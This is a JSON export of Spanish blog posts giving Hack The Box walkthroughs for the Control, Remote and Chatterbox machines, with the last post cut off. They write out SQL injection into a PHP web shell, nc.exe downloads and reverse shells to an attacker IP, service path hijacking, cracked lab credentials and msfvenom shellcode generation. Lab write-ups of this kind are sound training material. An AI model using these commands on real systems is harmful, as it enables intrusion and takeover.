[{"content":"Estadísticas    Característica Descripción     Nombre Control   OS Windows   Dificultad oficial Hard   Dificultad de comunidad    Puntos 40   Creadores TRX    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -opèn -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Warning: The -o option is deprecated. Please use -oN Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:44 EDT Initiating SYN Stealth Scan at 00:44 Scanning 10.10.10.167 [65535 ports] Discovered open port 3306/tcp on 10.10.10.167 Discovered open port 135/tcp on 10.10.10.167 Discovered open port 80/tcp on 10.10.10.167 Discovered open port 49666/tcp on 10.10.10.167 Discovered open port 49667/tcp on 10.10.10.167 Completed SYN Stealth Scan at 00:45, 26.41s elapsed (65535 total ports) Nmap scan report for 10.10.10.167 Host is up, received user-set (0.064s latency). Scanned at 2022-06-07 00:44:41 EDT for 26s Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 3306/tcp open mysql syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds Raw packets sent: 131084 (5.768MB) | Rcvd: 60 (2.496KB) Escaneo específico └─$ nmap -sCV -p 80,135,3306,49666,49667 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:45 EDT Nmap scan report for 10.10.10.167 Host is up (0.064s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Fidelity |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 3306/tcp open mysql? | fingerprint-strings: | NULL: |_ Host \u0026#39;10.10.14.16\u0026#39; is not allowed to connect to this MariaDB server 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.92%I=7%D=6/7%Time=629ED800%P=x86_64-pc-linux-gnu%r(NUL SF:L,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.16\u0026#39;\\x20is\\x20not\\x20allowe SF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds Enumeración Servicios http - 80 Manual Visualmente no se identificó nada relevante, dado que en su mayoría los textos contienen Lorem ipsum salvo algunas rutas expuestas mediante a la interacción con parte de la interfaz. Visualizando así un error en la ruta admin.php después de dar click al botón de Login.\nAl navegar al código fuente de la página inicial, se identificaron dos posibles pistas respecto a la construcción del sitio.\n  La exposición de código del sitio functions.js.\n  Una posible ruta hacia otro host o algo similar.\n  Al navegar al script se pueden identificar rutas que pudieran formar parte de un CRUD y que difícilmente puedan ser encontradas en algún diccionario de fuzzing.\nAl identificar la composición de la petición e interactuar con view_products.php haciendo uso de curl -i http://10.10.10.167/view_product.php -X POST -F \u0026quot;productId=1\u0026quot;, se puede observar una tabla en html permitiendo la suposición de que se desplegarían en este sitio los atributos del producto en cuestión.\nDespués de varias iteraciones, buscando un identificador válido (26) se puede visualizar que la suposición era la correcta.\nffuf Para complementar lo obtenido se buscaron rutas adicionales por medio de ffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html.\nExplotación Inyección SQL Ejecución Teniendo en cuenta la tecnología empleada y parte de los parámetros usados, se buscó explotar una inyección SQL haciendo uso de sqlmap, utilizando sqlmap -u \u0026quot;http://10.10.10.167/view_product.php\u0026quot; --data=\u0026quot;productId=1\u0026quot; --dbs obteniendo de esta forma payloads válidos y la capacidad de obtener los registros de la base de datos.\n Payload: productId=1 UNION ALL SELECT \u0026lt;query\u0026gt;-- -  Después no encontrar información relevante respecto a la aplicación web, se buscó obtener información respecto a los usuarios de la base de datos, mediante sqlmap -u \u0026quot;http://10.10.10.167/view_product.php\u0026quot; --data=\u0026quot;productId=1\u0026quot; -D mysql -T user --passwords obteniendo así sus hashes.\nA lo que posteriormente, una vez guardados se hizo uso de john para crackearlos.\nAdicional a ello, haciendo uso de CrackStation se obtuvo la contraseña de un hash adicional del cuál no se obtuvo con john.\nIdentificando así las credenciales:\nmanager:l3tm3!n hector:l33th4x0rhector RCE Después de obtener las credenciales y buscar emplearlas con los servicios expuestos en la máquina (mysql únicamente dado que no se cuenta con smb o algún otro servicio en donde se pudieran haber usado) se buscó la forma para que mediante la inyección SQL se para pudiera lograr la ejecución remota de código mediante la escritura de un script en php, haciendo uso de instrucciones como INTO OUTFILE o INTO DUMPFILE.\nPara lograrlo fue necesario identificar el directorio en el que se encuentra la instalación, de acuerdo al enlace encontrado se indica que por predeterminado la ruta suele ser c:\\inetpub\\wwwroot, permitiendo de esta forma complementar hacia dónde debería dirigirse la escritura del script.\nDespués de probar con diferentes payloads respecto al escape de las barras (\\), dado que la respuesta del servidor es identificada como un 500 Internal Server Error, se realizó una prueba de la escritura mediante curl -i http://10.10.10.167/view_product.php -X POST -F \u0026quot;productId=26 UNION ALL SELECT 'Hello world' INTO OUTFILE 'c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\test.txt'-- -\u0026quot; logrando escribir satisfactoriamente al archivo indicado.\nEn este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se esté ejecutando el payload indicado.\nVisualizandolo en el servidor.\nPermitiendo de esta manera cambiar el payload a curl -i http://10.10.10.167/view_product.php -X POST -F 'productId=26 UNION ALL SELECT \u0026quot;\u0026lt;?php system($_GET[\\\u0026quot;cmd\\\u0026quot;])?\u0026gt;\u0026quot; INTO OUTFILE \u0026quot;c:\\\\\\\\\\\\\\\\inetpub\\\\\\\\wwwroot\\\\\\\\srrequiem.php\u0026quot;-- -' logrando así tener un script listo para ejecutar comandos en la máquina.\nPor lo que se estableció una reverse shell haciendo uso del binario nc.exe, subiéndolo a la máquina mediante http://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\\windows\\temp\\nc.exe montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con http://10.10.10.167/srrequiem.php?cmd=c:\\windows\\temp\\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234, logrando así acceso de una manera más interactiva.\nPost Explotación Enumeración Al buscar atar cabos sueltos respecto a lo indicado en el código fuente del sitio, se pudo visualizar que en el contenido del script de admin.php se hace un filtrado de cabeceras indicado por HTTP_X_FORWARDED_FOR buscando la IP indicada 192.168.4.28. A lo que por consiguiente si se añadiera la cabecera X-Forwarded-For: 192.168.4.28 a las peticiones realizadas se visualizaría el contenido de admin.php, logrando así un bypass de la validación.\nEscalación de privilegios nt authority\\iusr → hector Habiendo identificado que existe el usuario hector en el sistema operativo por medio del listado de directorios de c:\\users, se dispuso a buscar la manera de ejecutar comandos mediante las credenciales obtenidas.\nHabiendo encontrado esta y esta referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario hector.\nPreviamente identificando el nombre de la máquina y/o hostname con hostname, $env:COMPUTERNAME o [Environment]::MachineName, según lo indica este blog para encontrar ese valor y usarlo posteriormente.\n$userName = \u0026#39;fidelity\\hector\u0026#39; $userPassword = \u0026#39;l33th4x0rhector\u0026#39; $secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force $credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword) Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { whoami } Logrando así ejecución como el usuario hector.\nDadas las limitaciones que se obtuvieron al ejecutar el mismo binario de netcat previamente subido debido a permisos, se decidió ejecutar el mismo binario con la diferencia de ejecutarlo a través de red, exponiendo el binario mediante impacket-smbserver smbFolder $(pwd) -smb2support y ejecutándolo con Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 4321 }. Obteniendo así una segunda revershell pero en esta ocasión como el usuario hector.\nhector → nt authority\\system Buscando obtener información relevante para escalar como administrador, se ejecutó winPEAS, identificando que se cuenta con un gran número de registros a los cuales se tiene acceso completo.\nBajo el conocimiento de escenarios previos, se sabe que es posible modificar la configuración de los servicios para poder secuestrar la ruta del binario, si se lograra identificar un servicio que se estuviera ejecutando como administrador al lograr la modificación e iniciar el servicio se obtendría acceso como administrador. Dichas configuraciones de servicios se suelen encontrar en los valores de los registros mostrados, por lo que, se realizó un filtrado de estos servicios bajo su perfil de ejecución y status para que a la hora de modificarlo se pudiera iniciar el servicio.\n$services = Get-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\* # Para obtener todos los servicios $filtered_services = $services | where { ($_.ObjectName -match \u0026#39;LocalSystem\u0026#39;) -And ($_.Start -match \u0026#39;3\u0026#39;) } # Para filtar y obtener los servicios que se ejecuten con permisos elevados y que se puedan iniciar manualmente En este punto quedaría filtrar los servicios a los que el usuario hector cuenta con permisos para iniciar cualquier servicio. Para esto se requiere identificar el servicio que cuente con la cadena RP según es especificado en este blog en la propiedad de Sddl de los permisos desplegados de la lista actual de servicios.\nLo que individualmente por servicio es ubicado en la propiedad Security, en donde se encuentra en forma binaria.\nTrasladandolo a una lectura similar a la propiedad sddl, se puede ejecutar cmd /c sc sdshow wuauserv para visualizar el valor de mejor manera.\nIgualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de ConvertFrom-SDDLString -Sddl \u0026quot;D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)\u0026quot; para visualizarlo de mejor manera ya que se permite su conversión mediante powershell.\nPor lo que se iteró en la lista previa de servicios la búsqueda de este permiso mediante el siguiente ciclo:\n$services_names = $filtered_services.pschildname foreach ($service in $services_names) { $sddl = (cmd /c sc sdshow $service) if ($sddl -match \u0026#34;RP[A-Z]*?;;;AU\u0026#34;) { $service } } # Iteración en una línea $canStartServices = foreach ($service in $services_names) {$sddl = (cmd /c sc sdshow $service); if ($sddl -match \u0026#34;RP[A-Z]*?;;;AU\u0026#34;) { $service }} Dando como resultado la lista de los servicios buscados.\nObteniendo lo anterior se puede modificar la propiedad ImagePath del servicio y ejecutar lo que se desee una vez que el servicio sea iniciado. Se puede lograr este comportamiento tanto como haciendo uso de cmd como de powershell.\nUsando powershell Mediante powershell habría que:\n Asegurar encontrarse en la ruta de los registros (cd HKLM:\\system\\currentcontrolset\\services). Obtener las propiedades del servicio querido (get-item -path seclogon). Visualizar el valor a cambiar de ImagePath   Ejecutar set-itemproperty seclogon -name imagepath -value \u0026quot;\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\u0026quot; para modificar los valores con los deseados. Obtener las propiedades del servicio querido seclogon para validar el cambio. Visualizar el cambio realizado a ImagePath.  El cual al montar la conexión de escucha, bastaría con iniciar el servicio con start-service seclogon para así ejecutar el binario indicado.\nUsando cmd Mediante cmd se realizaría el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutaría:\n reg query HKLM\\system\\currentcontrolset\\services\\seclogon para visualizar los valores del servicio. reg add HKLM\\system\\currentcontrolset\\services\\seclogon /v ImagePath /t REG_EXPAND_SZ /d \u0026quot;\\\\10.10.14.16\\smbFolder\\nc.exe -e cmd.exe 10.10.14.16 443\u0026quot; /f para cambiar los valores de la propiedad ImagePath de acuerdo a lo encontrado en este blog para realizar los cambios e identificar el tipo de dato a cambiar REG_EXPAND_SZ para efectuarlo correctamente. sc start seclogon para iniciar el servicio.  Notas adicionales Mientras resolvía la máquina encontré diversos problemas para ejecutar el mismo binario de netcat, ya hubiera sido si lo cargaba directamente a la máquina o lo ejecutaba a través del cliente smb, logré solucionarlo empleando otra subida de netcat mediante el usuario obtenido conforme iba realizando la escalación de privilegios.\nDado que durante el proceso de resolución personalmente busco lo equivalente a comparar respuestas en una evaluación por lo que, suelo leer write-ups y ver walkthroughs de otros usuarios principalmente de 0xdf e IppSec, noté que ambos hicieron referencia a AppLocker ya que el mismo problema se presentó. Después de buscar más información al respecto, encontré que existen rutas en Windows las cuales suelen estar libres de estas restricciones, encontrando varias listas de estas rutas en repositorios de github dándole motivo al uso de la ruta C:\\Windows\\System32\\spool\\drivers\\color que se emplea en los write-ups.\nReferencias  SQL Injection. CrackStation. SQLI to RCE. How to: Find the Web Application Root. How to use Start Process in PowerShell. Running commands in a specific user context in PowerShell. StackOverflow - PowerShell Jobs vs Start-Process. Powershell get computer name. How to edit the Registry using Command Prompt on Windows 10. Significado del valor Start en registros. Start Stop service rights to non administrators. What is AppLocker?. Ultimate AppLocker ByPass List.  ","permalink":"https://rzul.me/posts/htb-control/","summary":"Estadísticas    Característica Descripción     Nombre Control   OS Windows   Dificultad oficial Hard   Dificultad de comunidad    Puntos 40   Creadores TRX    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -opèn -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Control"},{"content":"Estadísticas    Característica Descripción     Nombre Remote   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:05 EDT Initiating SYN Stealth Scan at 09:05 Scanning 10.10.10.180 [65535 ports] Discovered open port 80/tcp on 10.10.10.180 Discovered open port 111/tcp on 10.10.10.180 Discovered open port 445/tcp on 10.10.10.180 Discovered open port 135/tcp on 10.10.10.180 Discovered open port 139/tcp on 10.10.10.180 Discovered open port 21/tcp on 10.10.10.180 Discovered open port 49664/tcp on 10.10.10.180 Discovered open port 49665/tcp on 10.10.10.180 Discovered open port 5985/tcp on 10.10.10.180 Discovered open port 49667/tcp on 10.10.10.180 Discovered open port 49678/tcp on 10.10.10.180 Discovered open port 47001/tcp on 10.10.10.180 Discovered open port 49680/tcp on 10.10.10.180 Discovered open port 49666/tcp on 10.10.10.180 Discovered open port 49679/tcp on 10.10.10.180 Discovered open port 2049/tcp on 10.10.10.180 Completed SYN Stealth Scan at 09:05, 13.25s elapsed (65535 total ports) Nmap scan report for 10.10.10.180 Host is up, received user-set (0.068s latency). Scanned at 2022-06-02 09:05:13 EDT for 13s Not shown: 65519 closed tcp ports (reset) PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 80/tcp open http syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49678/tcp open unknown syn-ack ttl 127 49679/tcp open unknown syn-ack ttl 127 49680/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds Raw packets sent: 65924 (2.901MB) | Rcvd: 65535 (2.621MB) Escaneo específico └─$ nmap -sCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:08 EDT Nmap scan report for 10.10.10.180 Host is up (0.064s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49678/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-06-02T13:09:19 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.15 seconds Enumeración Servicios http - 80 ffuf Al navegar a través del sitio disponible y no encontrar información relevante en primera instancia, se decidió enumerar directorios de manera automática mediante ffuf -c -ic -u http://10.10.10.180/FUZZ -w /usr/share/dirb/wordlists/common.txt, encontrando así el directorio umbraco el cual no pareció común bajo el contexto del sitio.\nManual Al navegar manualmente al directorio se visualizó un login, a lo que posteriormente se buscó información relacionada encontrando que se trataba de un sistema de gestor de contenidos (CMS).\nAl buscar rutas de explotación se encontró un exploit (junto con su repositorio) el cuál para ser ejecutado se requiere contar con credenciales válidas, abriendo paso a dos consideraciones de camino a la fase de explotación:\n Realizar búsqueda de credenciales por algún sitio (preferente). Realizar fuerza bruta al login (siempre último recurso).  mountd - 2049 Al identificar el servicio y encontrar que se trataba de exposición de puntos de montaje a través de red, se hizo uso de showmount -e 10.10.10.180 visualizando así el montaje site_backups.\nPosteriormente, para poder navegar a través del directorio e interactuar cómodamente se creó la carpeta /mnt/remote y se ejecutó sudo mount -t nfs 10.10.10.180:site_backups /mnt/remote -o nolock para montar ahí lo expuesto en el servidor.\nTeniendo en consideración la búsqueda de credenciales, se buscaron patrones en texto claro en el punto de montaje.\nAl buscar en los contenidos de los archivos señalados (los que resultaron más atractivos) se encontró en el archivo UmbracoTraceLog.intranet.txt un usuario potencial que se utilizó para continuar con la búsqueda de información.\nUtilizando lo encontrado, se procedió a hacer otra búsqueda descartando así múltiples archivos permitiendo verificar otros que con anterioridad no se revisaron.\nAl ser interpretado como binario, se uso strings Umbraco.pdf para interpretar los caracteres legibles identificando así las credenciales admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa.\nExplotación Cracking de hash obtenido Guardando el hash del usuario admin en un archivo y haciendo uso de john hashes --wordlist=/usr/share/wordlists/rockyou.txt se obtuvo la contraseña admin@htb.local:baconandcheese.\nRCE Después de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecutó python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami para corroborar su uso.\nHaciendo uso de Reverse Shell Generator se generó una reverse shell de powershell en base64 para entablar la conexión con python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAg[...].\nPost Explotación Enumeración Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de whoami /all se visualizó que el privilegio SeImpersonatePrivilege se encuentra habilitado, permitiendo su explotación haciendo uso de Rotten/JuicyPotato.\nPor medio de winPEAS se encontró que el servicio de TeamViewer se encuentra habilitado y ejecutándose. Concordando de alguna forma con el nombre de la máquina.\nPosteriormente, se realizó una búsqueda sobre los exploits disponibles sobre TeamViewer encontrando los siguientes.\nEn donde por curiosidad se tomó en consideración la exposición de credenciales y búscando más información al respecto se encontró el módulo de metasploit windows/gather/credentials/teamviewer_passwords y un repositorio en conjunto con su artículo en donde se realiza una PoC para descifrar las credenciales alojadas en registros de Windows.\nTambién dentro de la salida de winPEAS se visualiza que se cuenta con acceso completo al servicio UsoSvc, lo que permitiría modificar las opciones del servicio y detener o iniciar su ejecución.\nEscalación de privilegios iis apppool → nt authority system TeamViewer Al subir el script de powershell a la máquina, cargarlo como módulo en la sesión con Import-Module y ejecutar la función de extración Get-TeamViewPasswords, se descifró la contraseña !R3m0te!.\nEl mismo proceso puede ser realizado con el módulo de metasploit, sin embargo, es necesario tener una sesión abierta preferentemente de meterpreter (al tiempo que se resolvió la máquina el payload ejecutado fue windows/meterpreter_reverse_tcp)\nProbando posteriormente la contraseña con el usuario Administrator mediante impacket-psexec 'Administrator:!R3m0te!@10.10.10.180', obteniendo así acceso como NT AUTHORITY\\SYSTEM.\nModificación de servicios Mediante sc.exe qc UsoSvc se puede ver más a detalle información respecto este servicio.\nPor lo que haciendo uso de sc.exe config UsoSvc binpath=\u0026quot;c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.16 4321\u0026quot; se buscó la modificación de la ruta del binario a ejecutar sustituyéndola con la ejecución de netcat para entablar una reverse shell. Al consultar de nuevo la información del servicio, se observa la modificación del valor.\nPor consiguiente al poner la conexión a la escucha y realizar un reinicio del servicio net stop UsoSvc \u0026amp;\u0026amp; net start UsoSvc se logró tener acceso como NT AUTHORITY\\SYSTEM satisfactoriamente.\nJuicyPotato Debido al no tener éxito al aprovecharse del privilegio ni con el uso de JuicyPotato ni con PrintSpoofer se buscó corroborar con el writeup oficial, el cuál indica que debería ser válido el método, sin embargo, no se logró satisfactoriamente.\nReferencias  Exploit de Umbraco. Github - Exploit de Umbraco. HackTricks - Pentesting NFS Service. Microsoft - Importación de módulo en powershell. Github - Descifrado de contraseñas TeamViewer. Descrifrado de contraseñas TeamViewer post de blog. HackTricks - Local Privilege Escalation - Services  ","permalink":"https://rzul.me/posts/htb-remote/","summary":"Estadísticas    Característica Descripción     Nombre Remote   OS Windows   Dificultad oficial Easy   Dificultad de comunidad    Puntos 20   Creadores mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Remote"},{"content":"Estadísticas    Característica Descripción     Nombre Chatterbox   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores lkys37en    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:36 EDT Initiating Connect Scan at 13:36 Scanning 10.10.10.74 [65535 ports] Discovered open port 135/tcp on 10.10.10.74 Discovered open port 139/tcp on 10.10.10.74 Discovered open port 445/tcp on 10.10.10.74 Discovered open port 49152/tcp on 10.10.10.74 Discovered open port 49154/tcp on 10.10.10.74 Discovered open port 9256/tcp on 10.10.10.74 Discovered open port 49153/tcp on 10.10.10.74 Discovered open port 9255/tcp on 10.10.10.74 Discovered open port 49155/tcp on 10.10.10.74 Discovered open port 49157/tcp on 10.10.10.74 Discovered open port 49156/tcp on 10.10.10.74 Completed Connect Scan at 13:37, 29.11s elapsed (65535 total ports) Nmap scan report for 10.10.10.74 Host is up, received user-set (0.073s latency). Scanned at 2022-05-27 13:36:42 EDT for 29s Not shown: 54223 closed tcp ports (conn-refused), 11301 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack 9255/tcp open mon syn-ack 9256/tcp open unknown syn-ack 49152/tcp open unknown syn-ack 49153/tcp open unknown syn-ack 49154/tcp open unknown syn-ack 49155/tcp open unknown syn-ack 49156/tcp open unknown syn-ack 49157/tcp open unknown syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds Escaneo específico └─$ nmap -sCV -p 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 13:39 EDT Nmap scan report for 10.10.10.74 Host is up (0.074s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 9255/tcp open http AChat chat system httpd |_http-server-header: AChat |_http-title: Site doesn\u0026#39;t have a title. 9256/tcp open achat AChat chat system 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s | smb2-time: | date: 2022-05-27T22:40:43 |_ start_date: 2022-05-27T22:34:47 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Chatterbox | NetBIOS computer name: CHATTERBOX\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-05-27T18:40:47-04:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.63 seconds Enumeración Servicios achat - 9255, 9256 Manual Al buscar hacer un reconocimiento directamente por alguna versión vulnerable se encontró este repositorio en github de una prueba de concepto sobre la explotación del programa, probado en su versión y arquitectura AChat 0.150 Beta 7 Windows 7/8/10 x86/x64. Por lo que directamente se probó el exploit.\nExplotación Buffer Overflow - RCE Pasos previos | Preparación Dadas las indicaciones en la PoC se generó el shellcode correspondiente usando msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=$RHOST LHOST=10.10.14.16 LPORT=4321 exitfunc=thread -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python \u0026gt; scode.txt\nSustituyendo los valores correspondientes en el script del shellcode y host.\nEjecución Obteniendo acceso como el usuario alfred.\nPost Explotación Enumeración Posteriormente al ejecutar winPEAS, se identificaron dos rutas potenciales a probar:\n El usuario con el que se cuenta (alfred) tiene acceso completo al directorio del usuario Administrator. Existen credenciales AutoLogon 